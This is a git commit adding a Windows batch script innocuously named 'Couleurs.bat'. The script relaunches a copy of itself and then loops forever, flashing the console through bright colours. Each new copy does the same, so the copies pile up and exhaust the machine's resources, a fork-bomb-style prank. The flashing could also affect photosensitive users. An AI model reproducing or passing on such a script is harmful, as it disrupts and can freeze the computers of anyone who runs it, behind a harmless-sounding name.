71dacd931abf3c1cec407b5af6e25498e50de440
Enzo2911 <38391212+Enzo2911@users.noreply.github.com>
2018-05-02 16:42:44 +0200

    Add files via upload

---
+++ Couleurs.bat
@@ -0,0 +1,32 @@
+﻿
+    @echo off
+    color 0a
+    mode con cols=170 lines=43
+    :Party
+	start Couleurs.bat
+    cls
+    title SA PARS EN COUILLE
+    :bobp
+    color 1f
+    color 2f
+    color 3f
+    color 4f
+    color 5f
+    color 6f
+    color af
+    color bf
+    color cf
+    color df
+    color ef
+    color ff
+    goto bobp
+    :UP_BAR
+	
+    set /a FULL = FULL + 1
+    set BAR=%BAR% 
+    if "%bar%"=="                                                            " set BAR= 
+    echo %BAR%Û
+    ping 0.0.0.0 -n 0 >NUL
+    goto :UP_BAR
+    goto Awesome
+	
